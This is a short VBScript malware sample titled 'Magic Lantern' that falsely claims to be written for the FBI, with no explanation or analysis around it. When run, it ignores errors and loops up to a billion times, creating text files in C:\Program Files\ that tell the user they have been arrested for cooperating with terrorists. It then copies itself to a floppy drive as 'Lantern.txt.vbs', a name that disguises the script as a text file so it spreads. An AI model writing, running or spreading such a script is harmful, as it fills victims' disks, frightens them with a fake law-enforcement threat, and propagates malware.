'Magic Lantern - Written for use by the FBI
On Error Resume Next
Set FSO = Wscript.CreateObject("Scripting.FileSystemObject")
ThePath = "C:\Program Files\"
For Count = 1 to 1000000000
Set CTF = FSO.CreateTextFile(ThePath & Count & ".txt", True)
CTF.Write "You have been arrested for cooperation with a terrorist organization."
CTF.Close
Next
FSO.CopyFile Wscript.ScriptFullName, "A:\Lantern.txt.vbs", True